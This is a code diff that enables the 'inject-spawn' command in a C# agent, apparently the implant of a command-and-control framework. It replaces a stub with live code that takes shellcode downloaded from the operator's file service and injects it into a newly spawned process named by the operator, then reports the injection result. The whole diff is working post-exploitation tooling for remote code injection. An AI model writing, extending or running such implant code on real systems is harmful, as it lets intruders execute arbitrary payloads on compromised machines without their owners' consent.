@@ -14,37 +14,25 @@ namespace Agent.Commands
     {
         public override string Name => "inject-spawn";
 
-        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, MessageManager commm)
+        public override void InnerExecute(AgentTask task, AgentCommandContext context)
         {
-            throw new NotImplementedException();
-            //if (task.SplittedArgs.Length < 1)
-            //{
-            //    result.Result = $"Usage: {this.Name}  Process_Name_To_Start";
-            //    return;
-            //}
 
-            //var fileName = task.FileId;
-            //var fileContent = commm.Download(task.FileId, a =>
-            //{
-            //    result.Info = $"Downloading {fileName} ({a}%)";
-            //    commm.SendResult(result);
-            //}).Result;
+            this.CheckFileDownloaded(task, context);
 
-            //result.Result += $"Sehllcode size = {fileContent.Length}" + Environment.NewLine;
+            var file = context.FileService.ConsumeDownloadedFile(task.FileId);
+            var fileContent = file.GetFileContent();
 
-            //this.Notify(result, commm, $"{fileName} Downloaded");
+            var shellcode = fileContent;
 
-            //var shellcode = fileContent;
-
-            //var injectRes =  Injector.SpawnInjectWithOutput(fileContent, task.SplittedArgs[0]);
-            //if(!injectRes.Succeed)
-            //    result.Result += $"Injection failed : {injectRes.Error}";
-            //else
-            //{
-            //    result.Result += $"Injection succeed!" + Environment.NewLine;
-            //    if (!string.IsNullOrEmpty(injectRes.Output))
-            //        result.Result += injectRes.Output;
-            //}
+            var injectRes = Injector.SpawnInjectWithOutput(fileContent, task.SplittedArgs[0]);
+            if (!injectRes.Succeed)
+                context.Result.Result += $"Injection failed : {injectRes.Error}";
+            else
+            {
+                context.Result.Result += $"Injection succeed!" + Environment.NewLine;
+                if (!string.IsNullOrEmpty(injectRes.Output))
+                    context.Result.Result += injectRes.Output;
+            }
         }
     }
 }
